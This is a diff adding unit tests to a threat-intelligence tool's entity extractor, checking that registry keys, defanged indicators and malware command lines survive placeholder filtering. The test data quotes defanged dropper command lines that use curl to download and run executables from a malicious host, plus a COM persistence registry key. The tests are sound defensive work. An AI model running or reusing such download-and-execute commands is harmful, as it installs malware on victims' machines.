@@ -3876,6 +3876,60 @@ class TestEntityQualityBackstops:
             "Campaign <redacted>", "campaign",
         ) == "Campaign <redacted>"
 
+    def test_clsid_braces_in_a_registry_key_are_not_a_placeholder(self):
+        """`HKCU\\...\\CLSID\\{GUID}\\InprocServer32` is what a COM persistence
+        key looks like. One report's key was rejected here as a template and
+        came back as an AI-reviewer add on every run."""
+        from app.nodes.llm.entity_extraction import _normalize_placeholder_value
+
+        key = r"HKCU\SOFTWARE\Classes\CLSID\{5D4CFCB7-222C-4CA3-96B6-1F8195FBBB4B}\InprocServer32"
+        assert _normalize_placeholder_value(key, "ioc_registry_key") == key
+
+    def test_defang_brackets_are_not_a_placeholder(self):
+        """Only the refanged types shed `[.]` before this guard; a mutex, a
+        path or an email still carries it and must not be dropped for it."""
+        from app.nodes.llm.entity_extraction import _normalize_placeholder_value
+
+        assert _normalize_placeholder_value(
+            "user[at]evil[.]ru", "ioc_email",
+        ) == "user[at]evil[.]ru"
+        assert _normalize_placeholder_value(
+            r"C:\Users\Public\hxxp[://]drop", "ioc_file_path",
+        ) == r"C:\Users\Public\hxxp[://]drop"
+
+    def test_command_lines_keep_their_placeholders(self):
+        """A command line is a recipe: `<exeUrl>`, `<base64>` and a `{a,b}`
+        brace expansion are how sources print it. Both of one report's
+        command lines, quoted verbatim, were rejected here on every run."""
+        from app.nodes.llm.entity_extraction import _normalize_placeholder_value
+
+        kit_default = "curl -sS -o \"%TEMP%\\msgbox.exe\"'<exeUrl>' && '%TEMP%\\msgbox.exe'"
+        dropper = ('cmd.exe /c curl.exe -k -o "%APPDATA%\\x" '
+                   "hxxps://homepage.brianwilli[.]com/d/{wint.exe,calibre-launcher.dll} "
+                   '&& "%APPDATA%\\x\\wint.exe"')
+        for cmd in (kit_default, dropper):
+            assert _normalize_placeholder_value(cmd, "ioc_command_line") == cmd
+
+    def test_real_placeholders_are_still_rejected(self):
+        from app.nodes.llm.entity_extraction import _normalize_placeholder_value
+
+        assert _normalize_placeholder_value("Global\\{victim}_mutex", "ioc_mutex") is None
+        assert _normalize_placeholder_value("<REDACTED_USER>", "ioc_mutex") is None
+        assert _normalize_placeholder_value(
+            r"C:\Users\<REDACTED_USER_1>\evil.exe", "ioc_file_path",
+        ) is None
+
+    def test_command_lines_and_clsid_keys_survive_end_to_end(self):
+        from app.nodes.llm.entity_extraction import _process_entities
+
+        key = r"HKCU\SOFTWARE\Classes\CLSID\{5D4CFCB7-222C-4CA3-96B6-1F8195FBBB4B}\InprocServer32"
+        cmd = "curl -sS -o \"%TEMP%\\msgbox.exe\"'<exeUrl>' && '%TEMP%\\msgbox.exe'"
+        out = _process_entities([
+            {"entity_type": "ioc_registry_key", "value": key, "confidence": 0.9},
+            {"entity_type": "ioc_command_line", "value": cmd, "confidence": 1.0},
+        ])
+        assert {e["value"] for e in out} == {key, cmd}
+
     def test_victim_mailbox_is_not_an_indicator(self):
         from app.nodes.llm.entity_extraction import _is_victim_side_identifier
 
